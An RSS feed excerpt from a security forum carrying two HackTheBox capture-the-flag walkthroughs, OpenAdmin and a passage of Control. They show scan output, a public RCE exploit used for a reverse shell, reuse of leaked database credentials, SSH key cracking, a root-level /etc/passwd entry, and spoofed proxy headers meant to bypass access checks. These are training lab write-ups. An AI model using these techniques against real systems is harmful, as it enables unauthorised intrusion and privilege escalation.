<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Hackthebox Writeups - 0x00sec - The Home of the Hacker</title>
    <link>https://0x00sec.org/c/ctf/htb-writeups/103</link>
    <description>Topics in the &#39;Hackthebox Writeups&#39; category </description>
    
      <lastBuildDate>Fri, 09 Jul 2021 16:21:02 +0000</lastBuildDate>
      <atom:link href="https://0x00sec.org/c/ctf/htb-writeups/103.rss" rel="self" type="application/rss+xml" />
        <item>
          <title>Hackthebox : openadmin writeup</title>
          <dc:creator><![CDATA[jeff]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p>recently, hackthebox started an event called <code>take it easy</code>, where it made a bunch of retired easy machine accessible to everyone, so here’s my write up for the first box I’ve rooted in the event</p>
<h1>
<a name="reconnaissance-1" class="anchor" href="https://0x00sec.org#reconnaissance-1"></a>Reconnaissance</h1>
<p>I first added the machine in my hosts file as <code>openadmin.htb</code> then ran a regular nmap scan to get the open ports</p>
<pre><code class="lang-bash">$ sudo nmap openadmin.htb -v -oN ports
# Nmap 7.91 scan initiated Fri Jul  9 02:07:40 2021 as: nmap -v -oN ports openadmin.htb
Increasing send delay for 10.10.10.171 from 0 to 5 due to 42 out of 140 dropped probes since last increase.
Increasing send delay for 10.10.10.171 from 5 to 10 due to 213 out of 709 dropped probes since last increase.
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.099s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Jul  9 02:08:00 2021 -- 1 IP address (1 host up) scanned in 20.27 seconds
</code></pre>
<p>then a detailed scan against the 2 found services</p>
<pre><code class="lang-bash">$ nmap -v -sC -sV -p 80,22 -oN detailed_scan openadmin.htb
# Nmap 7.91 scan initiated Fri Jul  9 02:11:41 2021 as: nmap -v -sC -sV -p 80,22 -oN detailed_scan openadmin.htb
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.100s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  9 02:11:54 2021 -- 1 IP address (1 host up) scanned in 13.16 seconds
</code></pre>
<h1>
<a name="http-enumeration-2" class="anchor" href="https://0x00sec.org#http-enumeration-2"></a>http enumeration</h1>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/7/97dbb374db7a0f08febb5209774930ac8e89fc9e.png" data-download-href="/uploads/short-url/lFoNVqOuFoKh1hmCLLawfVik4Lc.png?dl=1" title="default appache page" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/9/7/97dbb374db7a0f08febb5209774930ac8e89fc9e_2_690x360.png" alt="default appache page" data-base62-sha1="lFoNVqOuFoKh1hmCLLawfVik4Lc" width="690" height="360" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/9/7/97dbb374db7a0f08febb5209774930ac8e89fc9e_2_690x360.png, https://0x00sec.s3.amazonaws.com/optimized/3X/9/7/97dbb374db7a0f08febb5209774930ac8e89fc9e_2_1035x540.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/9/7/97dbb374db7a0f08febb5209774930ac8e89fc9e.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/9/7/97dbb374db7a0f08febb5209774930ac8e89fc9e_2_10x10.png"></a></div><p></p>
<p>the box was serving a default apache index with no <code>robots.txt</code> whatsoever, so I’ve run some bruteforces to find hidden files/directories and I end up with the following results</p>
<pre><code class="lang-bash">[18:31:22] 301 -  314B  - /music  -&gt;  http://openadmin.htb/music/

[18:44:12] 200 -    4KB - /ona/login.php
[18:44:13] 200 -  127B  - /ona/logout.php
[18:44:15] 200 -   24KB - /ona/index.php
[18:45:57] 200 -    2B  - /ona/shell.php

[18:31:28] 301 -  316B  - /artwork  -&gt;  http://openadmin.htb/artwork/
[18:53:42] 200 -    9KB - /artwork/contact.html
[18:53:46] 200 -   11KB - /artwork/about.html
[18:53:48] 200 -  931B  - /artwork/main.html
[18:53:49] 200 -   11KB - /artwork/blog.html
[18:53:52] 200 -   11KB - /artwork/services.html
[18:53:53] 200 -  410B  - /artwork/readme.txt

[19:00:10] 301 -  315B  - /sierra  -&gt;  http://openadmin.htb/sierra/
[19:05:49] 200 -   42KB - /sierra/index.html
[19:05:51] 200 -   15KB - /sierra/contact.html
[19:06:07] 200 -   20KB - /sierra/blog.html
[19:06:08] 200 -   20KB - /sierra/about-us.html
[19:06:26] 200 -   22KB - /sierra/service.html
[19:06:31] 200 -   13KB - /sierra/portfolio.html
[19:07:46] 200 -    0B  - /sierra/contact_process.php
</code></pre>
<p>when you browse to <code>/music/login.php</code> you get directed to <code>/ona</code> which had the following page</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/f/0fe2d89261049ec3262ac3b5fe33fab640c5ba7b.png" data-download-href="/uploads/short-url/2gxaZFUfaWqT1T9vBZg2U2wk8WL.png?dl=1" title="insert ona.png" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/f/0fe2d89261049ec3262ac3b5fe33fab640c5ba7b_2_690x358.png" alt="insert ona.png" data-base62-sha1="2gxaZFUfaWqT1T9vBZg2U2wk8WL" width="690" height="358" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/f/0fe2d89261049ec3262ac3b5fe33fab640c5ba7b_2_690x358.png, https://0x00sec.s3.amazonaws.com/optimized/3X/0/f/0fe2d89261049ec3262ac3b5fe33fab640c5ba7b_2_1035x537.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/f/0fe2d89261049ec3262ac3b5fe33fab640c5ba7b.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/0/f/0fe2d89261049ec3262ac3b5fe33fab640c5ba7b_2_10x10.png"></a></div><p></p>
<p>this page disclose a bunch of info, first the domain <code>openadmin.htb</code> which we’ve already guessed, a mysql service running on localhost with the user <code>ona_sys</code>, and that we’re running on version v18.1.1  <b>which is not the latest version</b>, and a download link which revealed that the website us running an IP address management system called OpenNetAdmin</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/2/c2eacedc2782d836f76a9625cd2f8a5a5bba3067.png" data-download-href="/uploads/short-url/rOjHB3ct6SZayDx90ulD2werqZN.png?dl=1" title="the IP address management system" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/2/c2eacedc2782d836f76a9625cd2f8a5a5bba3067_2_690x356.png" alt="the IP address management system" data-base62-sha1="rOjHB3ct6SZayDx90ulD2werqZN" width="690" height="356" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/2/c2eacedc2782d836f76a9625cd2f8a5a5bba3067_2_690x356.png, https://0x00sec.s3.amazonaws.com/optimized/3X/c/2/c2eacedc2782d836f76a9625cd2f8a5a5bba3067_2_1035x534.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/2/c2eacedc2782d836f76a9625cd2f8a5a5bba3067.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/c/2/c2eacedc2782d836f76a9625cd2f8a5a5bba3067_2_10x10.png"></a></div><p></p>
<p>luckily for us this version had a vulnerability that led to remote code excution</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/9/494e82f3cc3278d4e743866104da7fdc68279d7c.png" data-download-href="/uploads/short-url/asv43SyUa36p9bMxnRbXP32F9Q8.png?dl=1" title="openNetAdmin remote code excution" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/9/494e82f3cc3278d4e743866104da7fdc68279d7c_2_690x357.png" alt="openNetAdmin remote code excution" data-base62-sha1="asv43SyUa36p9bMxnRbXP32F9Q8" width="690" height="357" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/9/494e82f3cc3278d4e743866104da7fdc68279d7c_2_690x357.png, https://0x00sec.s3.amazonaws.com/optimized/3X/4/9/494e82f3cc3278d4e743866104da7fdc68279d7c_2_1035x535.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/4/9/494e82f3cc3278d4e743866104da7fdc68279d7c.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/4/9/494e82f3cc3278d4e743866104da7fdc68279d7c_2_10x10.png"></a></div><p></p>
<p>now I just used the exploit in <a href="https://github.com/amriunix/ona-rce" rel="noopener nofollow ugc">this repo</a> to get a reverse shell</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/7/47a99fb283c962bc0bdeb510c8320c4e47f34e65.png" data-download-href="/uploads/short-url/adXjHrXg707NmPcT2VjFt4g5Ua1.png?dl=1" title="getting a reverse shell" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/7/47a99fb283c962bc0bdeb510c8320c4e47f34e65_2_690x386.png" alt="getting a reverse shell" data-base62-sha1="adXjHrXg707NmPcT2VjFt4g5Ua1" width="690" height="386" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/7/47a99fb283c962bc0bdeb510c8320c4e47f34e65_2_690x386.png, https://0x00sec.s3.amazonaws.com/optimized/3X/4/7/47a99fb283c962bc0bdeb510c8320c4e47f34e65_2_1035x579.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/4/7/47a99fb283c962bc0bdeb510c8320c4e47f34e65.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/4/7/47a99fb283c962bc0bdeb510c8320c4e47f34e65_2_10x10.png"></a></div><p></p>
<h1>
<a name="www-data-3" class="anchor" href="https://0x00sec.org#www-data-3"></a>www-data</h1>
<p>after getting in on the box I found some creds in <code>/opt/ona/www/local/config/database_settings.inc.php</code></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/5/25f6df8f667f96d50aef6a1462ff2c60842c2a32.png" data-download-href="/uploads/short-url/5pQAzReNiexDXBICv1iZHVyWmPg.png?dl=1" title="database password" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/5/25f6df8f667f96d50aef6a1462ff2c60842c2a32.png" alt="database password" data-base62-sha1="5pQAzReNiexDXBICv1iZHVyWmPg" width="690" height="386" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/2/5/25f6df8f667f96d50aef6a1462ff2c60842c2a32_2_10x10.png"></a></div><p></p>
<p>I’ve also found 2 users on the box, and the database password turned out to be re-used as jimmy’s</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/8/9/898fcfcf72613a9e98ca9217f3a70048e756391b.png" data-download-href="/uploads/short-url/jCVwMpQfFo4i2e3mNgYsDu2nCFJ.png?dl=1" title="other users" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/9/898fcfcf72613a9e98ca9217f3a70048e756391b.png" alt="other users" data-base62-sha1="jCVwMpQfFo4i2e3mNgYsDu2nCFJ" width="690" height="93" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/8/9/898fcfcf72613a9e98ca9217f3a70048e756391b_2_10x10.png"></a></div><p></p>
<h1>
<a name="jimmy-4" class="anchor" href="https://0x00sec.org#jimmy-4"></a>jimmy</h1>
<p>I’ve logged in trough ssh to get a nicer shell, then found an internal http server running on port 52846, hosted on <code>/var/www/internal/</code></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/e/0e9ac0e840a79f1c6b932199dc0bb57da3fd6e02.png" data-download-href="/uploads/short-url/25cf2gu7EFRbNCbJAPnx8rDTMPg.png?dl=1" title="internal http server" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/e/0e9ac0e840a79f1c6b932199dc0bb57da3fd6e02_2_690x179.png" alt="internal http server" data-base62-sha1="25cf2gu7EFRbNCbJAPnx8rDTMPg" width="690" height="179" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/e/0e9ac0e840a79f1c6b932199dc0bb57da3fd6e02_2_690x179.png, https://0x00sec.s3.amazonaws.com/optimized/3X/0/e/0e9ac0e840a79f1c6b932199dc0bb57da3fd6e02_2_1035x268.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/e/0e9ac0e840a79f1c6b932199dc0bb57da3fd6e02.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/0/e/0e9ac0e840a79f1c6b932199dc0bb57da3fd6e02_2_10x10.png"></a></div><p></p>
<p>basically <code>index.php</code> checks if the password is <code>jimmy</code> the the sha512 hash is equal to the hash shown in the picture, which is sha512 for the word “Revealed”</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/f/7/f7e672485a453ed2df8c02710674276e98e0f8f1.png" data-download-href="/uploads/short-url/zn1FbQgGTNV59mzeH9cMxQ3MHQZ.png?dl=1" title="internal appache index.php" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/f/7/f7e672485a453ed2df8c02710674276e98e0f8f1_2_690x93.png" alt="internal appache index.php" data-base62-sha1="zn1FbQgGTNV59mzeH9cMxQ3MHQZ" width="690" height="93" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/f/7/f7e672485a453ed2df8c02710674276e98e0f8f1_2_690x93.png, https://0x00sec.s3.amazonaws.com/optimized/3X/f/7/f7e672485a453ed2df8c02710674276e98e0f8f1_2_1035x139.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/f/7/f7e672485a453ed2df8c02710674276e98e0f8f1.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/f/7/f7e672485a453ed2df8c02710674276e98e0f8f1_2_10x10.png"></a></div><p></p>
<p>if this checks out it redirects the user to <code>main.php</code> which shows joanna’s private ssh key</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/f/1/f1bbf599f70ac124c35ebff48afe160e345cfa91.png" data-download-href="/uploads/short-url/yutLPCApK8dZJ1xOn8ucKq1FBAZ.png?dl=1" title="internal appache main.php" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/f/1/f1bbf599f70ac124c35ebff48afe160e345cfa91_2_690x149.png" alt="internal appache main.php" data-base62-sha1="yutLPCApK8dZJ1xOn8ucKq1FBAZ" width="690" height="149" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/f/1/f1bbf599f70ac124c35ebff48afe160e345cfa91_2_690x149.png, https://0x00sec.s3.amazonaws.com/optimized/3X/f/1/f1bbf599f70ac124c35ebff48afe160e345cfa91_2_1035x223.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/f/1/f1bbf599f70ac124c35ebff48afe160e345cfa91.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/f/1/f1bbf599f70ac124c35ebff48afe160e345cfa91_2_10x10.png"></a></div><p></p>
<p>I just called <code>main.php</code> directly with curl and got the key</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/f/cff63e7fdaf4334d2f002f6bc83737084909ef23.png" data-download-href="/uploads/short-url/tFIpxN2aanH1g98eIzOqL7h7ZuP.png?dl=1" title="joanna ssh private key" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cff63e7fdaf4334d2f002f6bc83737084909ef23_2_690x357.png" alt="joanna ssh private key" data-base62-sha1="tFIpxN2aanH1g98eIzOqL7h7ZuP" width="690" height="357" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cff63e7fdaf4334d2f002f6bc83737084909ef23_2_690x357.png, https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cff63e7fdaf4334d2f002f6bc83737084909ef23_2_1035x535.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/f/cff63e7fdaf4334d2f002f6bc83737084909ef23.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cff63e7fdaf4334d2f002f6bc83737084909ef23_2_10x10.png"></a></div><p></p>
<p>I cracked the ssh key with john and rockyou.txt, and logged in</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/3/b39c597180f11343422d839eddb36be9b9bf9ab1.png" data-download-href="/uploads/short-url/pCUrxCmEGIidXXMUTYgzwTCcPu1.png?dl=1" title="cracking joanna ssh keys" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/b/3/b39c597180f11343422d839eddb36be9b9bf9ab1_2_690x205.png" alt="cracking joanna ssh keys" data-base62-sha1="pCUrxCmEGIidXXMUTYgzwTCcPu1" width="690" height="205" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/b/3/b39c597180f11343422d839eddb36be9b9bf9ab1_2_690x205.png, https://0x00sec.s3.amazonaws.com/optimized/3X/b/3/b39c597180f11343422d839eddb36be9b9bf9ab1_2_1035x307.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/b/3/b39c597180f11343422d839eddb36be9b9bf9ab1.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/b/3/b39c597180f11343422d839eddb36be9b9bf9ab1_2_10x10.png"></a></div><p></p>
<h1>
<a name="joanna-5" class="anchor" href="https://0x00sec.org#joanna-5"></a>joanna</h1>
<p>once I’m was in, I found that I can edit a file with sudo privileges</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/a/4ab10d3264b89b0af2dd4074146d9db0976a2256.png" data-download-href="/uploads/short-url/aEKFasbM6ZjyMRix0s5Ymfj4SMK.png?dl=1" title="sudo -l" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/a/4ab10d3264b89b0af2dd4074146d9db0976a2256_2_690x119.png" alt="sudo -l" data-base62-sha1="aEKFasbM6ZjyMRix0s5Ymfj4SMK" width="690" height="119" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/a/4ab10d3264b89b0af2dd4074146d9db0976a2256_2_690x119.png, https://0x00sec.s3.amazonaws.com/optimized/3X/4/a/4ab10d3264b89b0af2dd4074146d9db0976a2256_2_1035x178.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/4/a/4ab10d3264b89b0af2dd4074146d9db0976a2256.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/4/a/4ab10d3264b89b0af2dd4074146d9db0976a2256_2_10x10.png"></a></div><p></p>
<p>I always have a custom <code>/etc/passwd</code> entry generated with <code>mkpasswd -m sha-512 PASSWORD -s SALT</code> for situations like this, all I have to do is to put it in there</p>
<p>I just pressed CTRL-L to load the content of <code>/etc/passwd</code>, put my entry as the user jeff and gave it a uid of 0, so I can have the same privileges as the root user, the file the file looked like this in the end</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/7/b7691857f8bd416f3a551fb4aa83a1fdbdc79096.png" data-download-href="/uploads/short-url/qawxCyFrCiVSn35sTq3ck2iajbg.png?dl=1" title="making a custom /etc/passwd entry" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/b/7/b7691857f8bd416f3a551fb4aa83a1fdbdc79096.png" alt="making a custom /etc/passwd entry" data-base62-sha1="qawxCyFrCiVSn35sTq3ck2iajbg" width="690" height="388" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/b/7/b7691857f8bd416f3a551fb4aa83a1fdbdc79096_2_10x10.png"></a></div><p></p>
<p>then I just overwrote /etc/passwd with the new cotent and logged in as jeff <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/3/236f3ae81a8a8011ea6f447c1f76ccb4c660dd8d.png" data-download-href="/uploads/short-url/53t1icEbBE7HkN9NdkLpoI01u4B.png?dl=1" title="logging in as jeff" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/2/3/236f3ae81a8a8011ea6f447c1f76ccb4c660dd8d_2_690x74.png" alt="logging in as jeff" data-base62-sha1="53t1icEbBE7HkN9NdkLpoI01u4B" width="690" height="74" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/2/3/236f3ae81a8a8011ea6f447c1f76ccb4c660dd8d_2_690x74.png, https://0x00sec.s3.amazonaws.com/optimized/3X/2/3/236f3ae81a8a8011ea6f447c1f76ccb4c660dd8d_2_1035x111.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/2/3/236f3ae81a8a8011ea6f447c1f76ccb4c660dd8d.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/2/3/236f3ae81a8a8011ea6f447c1f76ccb4c660dd8d_2_10x10.png"></a></div><p></p>
            <p><small>15 posts - 8 participants</small></p>
            <p><a href="https://0x00sec.org/t/hackthebox-openadmin-writeup/26519">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hackthebox-openadmin-writeup/26519</link>
          <pubDate>Fri, 09 Jul 2021 16:21:02 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-26519</guid>
          <source url="https://0x00sec.org/t/hackthebox-openadmin-writeup/26519.rss">Hackthebox : openadmin writeup</source>
        </item>
        <item>
          <title>HackTheBox Writeup: Control</title>
          <dc:creator><![CDATA[Baud]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p><span alt="immagine" data-base62-sha1="2cskb7DrkLjzBT7MWtxIN8Rd5Ns" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Control is a Hard difficulty Windows box (yay!) that was just retired from HackTheBox. Control was a very good challenge, it starts out in a pretty generic manner, requiring the exploitation of a SQL injection flaw in a web application that only allows users connecting from a specific proxy, but when local access is established the real fun begins.</p>
<p>And by fun I mean trial and error, because there is quite a bit of guess work going on in the privilege escalation part, but even if the box doesn’t tell you what to do in a huge font it still leaves out some hints so that you can get there in the end, when you realize that in order to escalate privileges you have to find a Windows service of which you can change the properties from the registry to hijack its execution when it is then started, which I thought was a pretty cool idea.</p>
<hr>
<h2>Enumeration</h2>
<p>A full nmap scan doesn’t reveal a big attack surface, with just HTTP MS-RPC and MySQL available:</p>
<pre><code class="lang-nohighlight">baud@kali:~/HTB/control$ sudo nmap -sC -sV -p- -T5 -oA fullScan 10.10.10.167
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-05 21:17 CEST
Nmap scan report for 10.10.10.167
Host is up (0.064s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Fidelity
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, JavaRMI, TerminalServer, WMSRequest: 
|_    Host '10.10.15.203' is not allowed to connect to this MariaDB server
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=4/5%Time=5E8A301A%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.203'\x20is
SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
SF:)%r(TerminalServer,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.203'\x20i
SF:s\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server
SF:")%r(JavaRMI,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.203'\x20is\x20n
SF:ot\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(W
SF:MSRequest,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.203'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 371.52 seconds
</code></pre>
<p>The IIS web server has a neat little application running that looks like this:</p>
<p><span alt="immagine" data-base62-sha1="puHsBKqvZastaiRJTR40iicZdDd" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>The only apparently interesting feature here is the Admin button, upon clicking it we are given an error stating we must go through a proxy in order to access the page, and that this proxy is supposed to add a special header to our HTTP requests:</p>
<p><span alt="immagine" data-base62-sha1="64nD7oVuiGxZdU4GQo4OjYHoqc7" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Here are a few headers commonly added by HTTP proxies when a client goes through one:</p>
<pre><code class="lang-http">X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
</code></pre>
<p>With a 127.0.0.1 address in, these headers actually become possible bypasses. A proxy will replace the 127.0.0.1 address with that of the client making the request to the application, which will check if the supplied IP is authorized to access the desired page.</p>
<p>Using 127.0.0.1 as the value of all these headers is a typical bypass based on the assumption that the server trusts requests coming from itself, thus thinking the requests come from a host that is authorized to access the application of interest.</p>
<p>Unfortunately for us, adding these headers manually with Burp and making a request to the Admin page returns the same exact error as before, meaning we are missing something. Perhaps localhost is not in the app’s access control whitelist. We’ll be back here soon.</p>
<p>Running Dirbuster allows to find a bunch of files and folders that are not apparent from the main site accessible to unauthenticated users, mainly the uploads folder and a bunch of PHP pages that have to do with product management of some sort (don’t mind the n2s.php page, it’s a web shell dropped by some other user):</p>
<p><span alt="immagine" data-base62-sha1="gWd5m27EFPYhJ7Vuxv8662TjHgc" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Other PHP pages are referenced by the /assets/js/functions.js script:</p>
<pre><code class="lang-auto">function deleteProduct(id) {
	document.getElementById("productId").value = id;
	document.forms["viewProducts"].action = "delete_product.php";
	document.forms["viewProducts"].submit();
}
function updateProduct(id) {
	document.getElementById("productId").value = id;
	document.forms["viewProducts"].action = "update_product.php";
	document.forms["viewProducts"].submit();
}
function viewProduct(id) {
	document.getElementById("productId").value = id;
	document.forms["viewProducts"].action = "view_product.php";
	document.forms["viewProducts"].submit();
}
function deleteCategory(id) {
	document.getElementById("categoryId").value = id;
	document.forms["categoryOptions"].action = "delete_category.php";
	document.forms["categoryOptions"].submit();
}
function updateCategory(id) {
	document.getElementById("categoryId").value = id;
	document.forms["categoryOptions"].action = "update_category.php";
	document.forms["categoryOptions"].submit();
}
</code></pre>
<p>Plus, /assets/js/checkvalues.js implements some client-side checks for the validity of user supplied input, a probable indicator of custom code running in the web application’s Admin area where those product-related PHP pages can be accessed:</p>
<pre><code class="lang-auto">function checkValues(form) {
   if (form == "updateProduct") {
      var name = document.forms["updateProduct"]["name"].value;
      var quantity = document.forms["updateProduct"]["quantity"].value;
      var price = document.forms["updateProduct"]["price"].value;
      if (name.length &lt;= 0) {
         alert("Name cannot be empty!");
         return false;
      }
      if (quantity &lt; 0 || quantity == "") {
         alert("Quantity cannot be less than 0!");
         return false;
      }
      if (price == 0 || price.includes("-")) {
         alert("Price must be greater than 0");
         return false;
      }
   } else if (form == "createProduct") {
      var name = document.forms["createProduct"]["name"].value;
      var quantity = document.forms["createProduct"]["quantity"].value;
      var price = document.forms["createProduct"]["price"].value;
      if (name.length &lt;= 0) {
         alert("Name cannot be empty!");
         return false;
      }
      if (quantity &lt; 0 || quantity == "") {
         alert("Quantity cannot be less than 0!");
         return false;
      }
